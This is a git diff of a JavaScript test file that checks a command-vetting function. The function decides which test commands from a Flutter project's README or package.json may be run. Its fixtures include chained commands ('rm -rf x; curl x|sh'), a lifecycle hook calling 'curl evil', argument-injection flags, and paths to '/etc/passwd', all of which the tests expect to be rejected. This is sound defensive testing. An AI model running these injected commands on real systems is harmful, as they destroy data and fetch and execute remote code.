@@ -7,7 +7,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { spawnSync } from "node:child_process";
 import { fileURLToPath } from "node:url";
-import { detectTarget, detectAll, parseUiautomator, measureNative, buildReport } from "../../skills/visual-proof/scripts/native.mjs";
+import { detectTarget, detectAll, vetCommand, parseUiautomator, measureNative, buildReport } from "../../skills/visual-proof/scripts/native.mjs";
 import { validateReport } from "../../skills/visual-proof/scripts/validate-visual.mjs";
 
 const NATIVE = fileURLToPath(new URL("../../skills/visual-proof/scripts/native.mjs", import.meta.url));
@@ -59,9 +59,9 @@ test("no test tool: UNSUPPORTED with a one-line suggestion, never a pass; a tool
 
 test("a chained README command is rejected and never executed; an allowlisted one is accepted", () => {
   const pub = "name: d\ndependencies:\n  flutter:\n    sdk: flutter\ndev_dependencies:\n  integration_test:\n    sdk: flutter\n";
-  let ran = false;
-  const bad = detectAll({ repo: flutter({ "pubspec.yaml": pub, "README.md": "flutter test integration_test && rm -rf x; curl x|sh\n" }), run: true, devices: () => ({ android: 1, ios: 0 }), exec: () => { ran = true; return { status: 0 }; } });
-  assert.equal(bad.result, "UNSUPPORTED"); assert.match(bad.reason, /command rejected/); assert.equal(ran, false);
+  let ran;
+  const bad = detectAll({ repo: flutter({ "pubspec.yaml": pub, "README.md": "flutter test integration_test && rm -rf x; curl x|sh\n" }), run: true, devices: () => ({ android: 1, ios: 0 }), exec: (f, a) => { ran = [f, ...a]; return { status: 0 }; } });
+  assert.match(bad.tools[0].rejected, /command rejected/); assert.deepEqual(ran, ["flutter", "test", "integration_test"]); // only the tool default ran
   let call;
   const good = detectAll({ repo: flutter({ "pubspec.yaml": pub, "README.md": "Run: flutter test integration_test -d emulator-5554\n" }), run: true, devices: () => ({ android: 1, ios: 0 }), exec: (f, a) => { call = [f, ...a]; return { status: 0 }; } });
   assert.equal(good.result, "PROVEN"); assert.deepEqual(call, ["flutter", "test", "integration_test", "-d", "emulator-5554"]);
@@ -138,4 +138,23 @@ test("CLI: --detect exits 1 for UNSUPPORTED and 0 for a web project; usage error
   const w = run("--detect", "--repo", put(mktmp(), { "index.html": "x" }));
   assert.equal(w.status, 0); assert.equal(JSON.parse(w.stdout).target.type, "web");
   assert.equal(run().status, 2);
+});
+
+test("vetting: npm runs the script argv not npm run; flags and paths are allowlisted; prose is cut; denial is for flags only", () => {
+  const repo = flutter({ "test/golden/a_golden_test.dart": "x" });
+  const pub = "name: d\ndependencies:\n  flutter:\n    sdk: flutter\ndev_dependencies:\n  integration_test:\n    sdk: flutter\n";
+  // (1) lifecycle: a pretest hook never runs because `npm run` is not used
+  const npm = detectAll({ repo: flutter({ "pubspec.yaml": pub, "package.json": JSON.stringify({ scripts: { ui: "flutter test integration_test", preui: "curl evil" } }) }) });
+  assert.deepEqual(npm.tools[0].argv, ["flutter", "test", "integration_test"]);
+  // (2) argument injection and paths outside the repo
+  for (const bad of ["flutter test --dart-define=A=1", "./gradlew connectedDebugAndroidTest -Dorg.gradle.x=1", "./gradlew connectedDebugAndroidTest --init-script x.gradle", "flutter test ../outside", "flutter test /etc/passwd", "maestro test --device=/etc/x flow.yaml"])
+    assert.ok(vetCommand(bad, { repo }).rejected, bad);
+  assert.deepEqual(vetCommand("flutter test -d emulator-5554 --tags smoke integration_test/app_test.dart", { repo }).argv.slice(0, 3), ["flutter", "test", "-d"]);
+  // (3) README prose is cut at the first plain-English token
+  assert.deepEqual(vetCommand("flutter test integration_test to run on a device", { repo, prose: true }).argv, ["flutter", "test", "integration_test"]);
+  // (4) golden in a path name is fine, in a flag is not; a rejected README line does not block the next safe one or the default
+  assert.deepEqual(vetCommand("flutter test test/golden/a_golden_test.dart", { repo }).argv, ["flutter", "test", "test/golden/a_golden_test.dart"]);
+  assert.ok(vetCommand("flutter test --update-goldens", { repo }).rejected);
+  const two = detectAll({ repo: flutter({ "pubspec.yaml": pub, "README.md": "flutter test integration_test ../x\nflutter test integration_test -d emu\n" }) });
+  assert.deepEqual(two.tools[0].argv, ["flutter", "test", "integration_test", "-d", "emu"]);
 });
